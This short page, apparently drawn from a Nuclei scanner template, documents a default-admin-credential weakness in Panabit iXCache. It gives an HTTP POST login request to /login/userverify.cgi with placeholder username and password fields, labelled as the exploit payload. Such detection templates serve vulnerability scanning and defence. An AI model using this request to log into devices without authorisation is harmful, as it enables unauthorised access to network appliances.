# Nuclei Template: Panabit iXCache - Default Admin Login
**Template ID:** panabit-ixcache-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`panabit-ixcache-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Panabit iXCache default admin login credentials were successful.

## Steps to reproduce / Exploit Payload
```http
POST /login/userverify.cgi HTTP/1.1
Host: {{Hostname}}

username={{username}}&password={{password}}
```

## References
- http://forum.panabit.com/thread-10830-1-1.html
